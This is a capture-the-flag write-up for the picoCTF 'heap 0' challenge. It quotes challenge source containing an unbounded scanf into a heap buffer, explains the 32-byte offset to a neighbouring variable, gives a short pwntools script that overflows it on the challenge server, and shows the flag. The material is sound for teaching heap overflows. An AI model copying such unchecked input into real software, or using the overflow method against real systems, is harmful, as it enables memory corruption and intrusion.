# heap 0

Are overflows just a stack concern? Download the binary [here](https://artifacts.picoctf.net/c_tethys/13/chall). Download the source [here](https://artifacts.picoctf.net/c_tethys/13/chall.c).

Given the sourcecode, we see the win condition in function `check_win()`:

```c
void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```

For this, we just need to change `safe_var` to be anything other than `bico`.

Further analysis also finds a buffer overflow in the `write_buffer()` function. This contains a call to `scanf()` which lacks boundary checks meaning we can overwrite adjacent memory locations.

```c
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```

As the memory locations of `safe_var` and `input_data` are printed to the console, we can subtract them and see the difference is 32 bytes. As such, we need to provide a string via option 2 of at least 33 bytes to cause the overflow.

We can use option 2 to write a buffer, send a large amount of data to cause a crash and then print the flag with option 4:

![[picoctf/images/Pasted image 20250210211916.png]]

```python
from pwn import *

context.binary = binary = ELF("chal")

p = remote("tethys.picoctf.net", 65235)

p.sendline(b"2")

p.sendline(b"A" * 32 + b'B' * 4)

p.sendline(b"4")

p.interactive()
```

```
picoCTF{my_first_heap_overflow_4fa6dd49}
```
